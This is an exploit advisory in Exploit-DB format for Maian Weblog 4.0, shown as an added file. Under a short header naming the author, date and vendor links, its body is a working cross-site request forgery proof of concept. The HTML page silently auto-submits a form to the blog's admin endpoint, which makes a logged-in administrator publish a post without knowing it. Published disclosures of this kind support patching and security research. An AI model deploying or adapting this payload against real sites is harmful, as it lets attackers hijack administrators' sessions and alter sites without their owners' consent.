@@ -1,0 +1,35 @@
+# Exploit Title :              Maian Weblog 4.0 - Cross-Site Request
+Forgery ( Add New Post)
+# Author :                     Besim
+# Google Dork :                 -
+# Date :                       10/10/2016
+# Type :                       webapps
+# Platform :                   PHP
+# Vendor Homepage :   http://www.maianweblog.com
+# Software link :
+ http://www.hotscripts.com/listings/jump/download/21864
+
+
+
+
+*########################### CSRF PoC ###############################*
+
+
+<html>
+  <!-- CSRF PoC -->
+  <body>
+    <form action="http://site_name/mainb/publish/admin/index.php?cmd=add"
+method="POST">
+      <input type="hidden" name="process" value="1" />
+      <input type="hidden" name="title" value="Murat" />
+      <input type="hidden" name="comments"
+value="Muratttttt&#13;&#10;<br&#32;&#47;>" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+
+*####################################################################*
